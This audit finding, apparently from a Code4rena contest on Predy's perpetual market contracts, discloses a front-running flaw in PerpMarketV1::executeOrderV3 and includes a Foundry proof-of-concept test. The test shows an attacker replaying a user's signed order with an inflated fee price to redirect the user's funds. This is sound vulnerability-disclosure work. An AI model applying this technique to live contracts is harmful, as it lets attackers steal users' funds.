# Vulnerability details

## Impact

By design everyone can close their position by calling `PerpMarketV1::executeOrderV3` with signed order (`order`) and settlement parameters (`settlementParams`).

An attacker can front-run a user's order with the same `order` and high `settlementParams.feePrice`, the `fee` will be calculated at

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/base/BaseMarketUpgradable.sol#L70

then the `fee` will be sent to `settlementParams.sender`, which is the attacker's address

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/base/SettlementCallbackLib.sol#L55-L57

As a result, when a user closes a position the attacker can steal his or her fund.

## Proof of Concept

`test/POC.t.sol`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {console} from "forge-std/Test.sol";

import {TestPerpMarket} from "./market/perp/Setup.t.sol";
import {OrderInfo} from "../src/libraries/orders/OrderInfoLib.sol";
import {PerpOrderV3} from "../src/markets/perp/PerpOrderV3.sol";
import {PerpMarketLib} from "../src/markets/perp/PerpMarketLib.sol";
import {MockPriceFeed} from "./mocks/MockPriceFeed.sol";
import {Constants} from "../src/libraries/Constants.sol";
import {IFillerMarket} from "../src/interfaces/IFillerMarket.sol";

contract POC is TestPerpMarket {
    uint256 userPrivateKey;
    address user;
    address attacker = address(0x1337);

    MockPriceFeed private _priceFeed;

    uint256 MIN_QUOTE_PRICE = Constants.Q96 * 11 / 10;

    function setUp() public override {
        TestPerpMarket.setUp();

        _priceFeed = new MockPriceFeed();

        _priceFeed.setSqrtPrice(2 ** 96);

        registerPair(address(currency1), address(_priceFeed));
        perpMarket.updateQuoteTokenMap(1);

        predyPool.supply(1, true, 1e10);
        predyPool.supply(1, false, 1e10);

        userPrivateKey = 0x12341234;
        user = vm.addr(userPrivateKey);

        currency1.mint(user, 2 ** 250);

        vm.prank(user);
        currency1.approve(address(permit2), type(uint256).max);
    }

    function test() public {
        {
            PerpOrderV3 memory order = PerpOrderV3(
                OrderInfo(address(perpMarket), user, 0, block.timestamp + 100),
                1,
                address(currency1),
                "Sell",
                2 * 1e6,
                2 * 1e6 * 101 / 100,
                0,
                0,
                1,
                false,
                false,
                abi.encode(PerpMarketLib.AuctionParams(0, 0, 0, 0))
            );

            IFillerMarket.SignedOrder memory signedOrder = _createSignedOrder(order, userPrivateKey);

            perpMarket.executeOrderV3(signedOrder, _getUniSettlementDataV3(0));
        }

        {
            PerpOrderV3 memory order = PerpOrderV3(
                OrderInfo(address(perpMarket), user, 1, block.timestamp + 100),
                1,
                address(currency1),
                "Buy",
                2 * 1e6,
                0,
                0,
                0,
                1,
                false,
                false,
                abi.encode(PerpMarketLib.AuctionParams(2 * Constants.Q96, 2 * Constants.Q96, 0, 0))
            );
            IFillerMarket.SignedOrder memory signedOrder = _createSignedOrder(order, userPrivateKey);

            console.log("Before: %d ", currency1.balanceOf(attacker));

            bytes memory path = abi.encodePacked(address(currency0), uint24(500), address(currency1));

            vm.prank(attacker);
            perpMarket.executeOrderV3(signedOrder, IFillerMarket.SettlementParamsV3(
                address(uniswapSettlement), path, MIN_QUOTE_PRICE, 0, 0, 99 * Constants.Q96 / 100, 0)
            );

            vm.prank(user);
            vm.expectRevert();
            perpMarket.executeOrderV3(signedOrder, _getUniSettlementDataV3(MIN_QUOTE_PRICE));

            console.log("After: %d ", currency1.balanceOf(attacker));
        }
    }
}
```
